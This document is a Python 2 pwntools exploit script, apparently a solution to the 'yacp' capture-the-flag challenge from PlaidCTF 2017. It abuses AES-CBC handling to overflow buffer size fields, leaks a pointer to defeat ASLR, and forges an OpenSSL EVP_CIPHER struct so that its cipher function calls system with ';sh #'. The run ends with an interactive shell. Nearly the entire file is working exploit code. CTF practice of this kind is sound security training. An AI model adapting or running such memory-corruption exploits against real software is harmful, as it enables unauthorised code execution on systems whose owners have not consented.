#!/usr/bin/env python2
from pwn import *
from Crypto.Cipher import AES

# WRITEUP: http://br0ns.dk/posts/pctf17/yacp

# Disable POW:
# sock = process(['./yacp', 'x'], env={'LD_LIBRARY_PATH': os.getcwd()})

sock = process('./yacp', env={'LD_LIBRARY_PATH': os.getcwd()})
# sock = remote('yacp.chal.pwning.xxx', 7961)

sock.recvuntil('It starts with ')
prefix = sock.recvn(16)
magic = subprocess.check_output(
    'pow sha256 1{28} -p %s -n 32 --alnum' % prefix,
    shell=True)
sock.sendline(magic)

def sync():
    sock.recvline_contains('5. Display data')

def display(n):
    sync()
    sock.sendline('5')
    sock.sendline(str(n))
    sock.recvuntil('buffer[')
    line = sock.recvline()
    data = line.split('=')[1].strip().decode('hex')
    return data

def encrypt(ni, no, nk, niv, cipher='AES-256-CBC'):
    sync()
    sock.sendline('3')
    sock.recvuntil('perform?\n')
    sock.sendline(cipher)
    sock.recvuntil('use?\n')
    sock.sendline(str(ni))
    sock.recvuntil('use?\n')
    sock.sendline(str(no))
    sock.recvuntil('use?\n')
    sock.sendline(str(nk))
    sock.recvuntil('use?\n')
    sock.sendline(str(niv))

def decrypt(ni, no, nk, niv, cipher='AES-256-CBC'):
    sync()
    sock.sendline('4')
    sock.recvuntil('perform?\n')
    sock.sendline(cipher)
    sock.recvuntil('use?\n')
    sock.sendline(str(ni))
    sock.recvuntil('use?\n')
    sock.sendline(str(no))
    sock.recvuntil('use?\n')
    sock.sendline(str(nk))
    sock.recvuntil('use?\n')
    sock.sendline(str(niv))

def load(n, data):
    sync()
    sock.sendline('0')
    sock.sendline(str(len(data)))
    sock.sendline(str(n))
    sock.sendline(data.encode('hex'))

# Set these for later.  No need to load them as all buffers are zero
# initialized.
key = '\x00' * 32
IV = '\x00' * 16

def setsize0(size0):
    # See writeup for an explanation of this
    pt = 'A' * (2048 - 16)
    padding = '\x10' * 16

    ct = AES.new(key=key, IV=IV, mode=AES.MODE_CBC).encrypt(pt)
    c126 = ct[-16:]

    c128 = pack(size0, word_size=128)
    x128 = AES.new(key=key).decrypt(c128)

    c127 = xor(padding, x128)
    x127 = AES.new(key=key).decrypt(c127)

    p127 = xor(x127, c126)

    pt += p127

    # Can be anything but 0 and 31
    load(1, pt)
    # Overflow into sizes #0-4, select key and IV arbitrarily
    encrypt(1, 31, 2, 3)

# Leak a pointer to the current cipher
size0  = 32 * 2048 # buffers
size0 += 32 * 4    # sizes
size0 += 24        # digest context
size0 += 140       # cipher context
size0 += 4         # digest pointer
size0 += 4         # cipher pointer
setsize0(size0)

data = display(0)
cipher_ptr = u32(data[-4:])

# This offset was found by comparing to `/proc/<pid>/maps`
libcrypto = cipher_ptr - 0x1da660

# Once a single pointer is known ASLR is completely defeated on Linux
# Again, this offset was found from `/proc/<pid>/maps`
libc = libcrypto - 0x1b6000

# Overflow
size0  = 2048   # buffer #31
size0 += 32 * 4 # the sizes
size0 += 24     # digest ctx
size0 += 4      # field `cipher` in cipher ctx
size0 += 5      # length of ";sh #"

# Align to block size to make everything is overwritten in `EVP_CipherUpdate`
size0 = align(16, size0)
setsize0(size0)

# Construct fake `EVP_CIPHER`
system = libc + 0x0003ada0
EVP_CIPH_FLAG_CUSTOM_CIPHER = 0x100000
fake_cipher = fit({
    0x10: EVP_CIPH_FLAG_CUSTOM_CIPHER, # flags
    0x18: system,                      # do_cipher
}, length=52)

# Buffer #4 was picked arbitrarily
load(4, fake_cipher)
fake_cipher_ptr = 0x0804c0e0 + 2048 * 4

# Construct overflow; will start at the size variables
sizes = 'A' * (32 * 4)
digest_ctx = 'B' * 24
cipher_ctx = fit({
    0: fake_cipher_ptr,
    4: ';sh #',
})

overflow = flat(
    sizes,
    digest_ctx,
    cipher_ctx,
)

# Better safe than sorry
print len(overflow), size0
assert len(overflow) + 2048 <= size0

# `AES.encrypt` expects the plaintext to be a multiple of the block size
overflow = overflow.ljust(align(16, len(overflow)))

ct = AES.new(key=key, IV=IV, mode=AES.MODE_CBC).encrypt(overflow)
load(1, ct)

# Attack!
decrypt(0, 31, 2, 3)

sock.interactive()
